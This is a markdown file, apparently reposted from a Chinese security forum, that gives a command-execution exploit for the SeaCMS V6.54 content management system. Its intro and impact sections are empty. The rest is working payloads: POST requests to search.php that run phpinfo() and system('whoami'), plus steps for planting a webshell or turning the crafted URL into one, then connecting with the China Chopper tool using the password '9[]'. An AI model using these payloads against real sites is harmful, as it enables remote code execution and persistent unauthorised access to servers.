@@ -1,0 +1,49 @@
+# Seacms V6.54
+
+> 原文：[https://www.zhihuifly.com/t/topic/3115](https://www.zhihuifly.com/t/topic/3115)
+
+# Seacms V6.54 命令执行漏洞
+
+## 一、漏洞简介
+
+## 二、漏洞影响
+
+## 三、复现过程
+
+### 命令执行payload
+
+> path:
+
+```
+http://0-sec.org/search.php 
+```
+
+> POST:
+
+```
+searchtype=5&searchword={if{searchpage:year}&year=:e{searchpage:area}}&area=v{searchpage:letter}&letter=al{searchpage:lang}&yuyan=(join{searchpage:jq}&jq=($_P{searchpage:ver}&&ver=OST[9]))&9[]=ph&9[]=pinfo(); 
+```
+
+* * *
+
+> path:
+
+```
+http://0-sec.org/search.php 
+```
+
+> POST:
+
+```
+searchtype=5&searchword={if{searchpage:year}&year=:e{searchpage:area}}&area=v{searchpage:letter}&letter=al{searchpage:lang}&yuyan=(join{searchpage:jq}&jq=($_P{searchpage:ver}&&ver=OST[9]))&9[]=sy&9[]=stem("whoami"); 
+```
+
+> 权限足够的话，`file_put_concents(“connect.php”,”“)`，然后连接菜刀即可
+
+> 权限不足的话，利用payload构造url：
+
+```
+http://0-sec.org/search.php?searchtype=5&searchword={if{searchpage:year}&year=:e{searchpage:area}}&area=v{searchpage:letter}&letter=al{searchpage:lang}&yuyan=(join{searchpage:jq}&jq=($_P{searchpage:ver}&&ver=OST[9])) 
+```
+
+> 连接放入菜刀，密码是 9[]
